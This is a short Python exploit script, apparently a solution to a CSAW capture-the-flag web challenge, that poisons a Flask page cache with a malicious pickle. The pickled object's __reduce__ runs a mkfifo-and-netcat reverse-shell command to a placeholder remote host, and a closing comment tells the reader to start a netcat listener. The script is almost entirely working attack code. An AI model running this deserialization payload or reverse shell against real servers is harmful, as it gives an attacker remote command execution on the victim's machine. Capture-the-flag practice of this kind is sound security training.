from requests import *
import time, os, pickle
host = "http://web.chal.csaw.io:5000/"

class RCE:
    def __reduce__(self):
        cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | '
               '/bin/sh -i 2>&1 | nc [YOUR_REMOTE_HOST_ADDR] 1234 > /tmp/f')
        return os.system, (cmd,)
pickled = b'!' + pickle.dumps(RCE())

open("x", "wb").write(pickled)

files = {'content': open('x','rb')}
values = {'title': 'flask_cache_view//test21'}
get(host + "test21")
time.sleep(0.8)
post(host, files=files, data=values)
time.sleep(0.8)
get(host + "test21")



# on remote host, run `nc -nvl 1234`
